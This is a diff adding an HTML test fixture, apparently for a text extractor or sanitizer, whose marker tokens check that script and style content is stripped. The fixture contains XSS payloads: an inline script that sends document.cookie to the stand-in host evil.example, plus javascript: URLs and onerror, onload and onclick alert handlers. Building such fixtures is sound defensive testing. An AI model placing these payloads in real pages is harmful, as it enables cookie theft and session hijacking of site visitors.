@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Totally Benign Page</title>
+  <script>
+    // XSS payload #1 — inline script body. This token MUST NOT be indexed.
+    var STEAL = "XSS_SCRIPT_BODY_MARKER";
+    document.location = "https://evil.example/?c=" + document.cookie;
+    alert('xss-alert-marker');
+  </script>
+  <style>
+    /* XSS_STYLE_MARKER — style content must also be stripped */
+    body { background: url("javascript:alert('xss-style-marker')"); }
+  </style>
+</head>
+<body>
+  <h1>Welcome</h1>
+  <p>This is the only real visible text: LEGIT_VISIBLE_MARKER.</p>
+  <img src="x" onerror="alert('XSS_ONERROR_MARKER')" />
+  <svg onload="alert('XSS_SVG_ONLOAD_MARKER')"></svg>
+  <a href="javascript:alert('XSS_HREF_MARKER')">click</a>
+  <iframe src="javascript:alert('XSS_IFRAME_MARKER')"></iframe>
+  <div onclick="alert('XSS_ONCLICK_MARKER')">more text BODY_TEXT_MARKER</div>
+  <noscript>XSS_NOSCRIPT_MARKER fallback</noscript>
+  <script>var SECOND = "XSS_SECOND_SCRIPT_MARKER";</script>
+</body>
+</html>
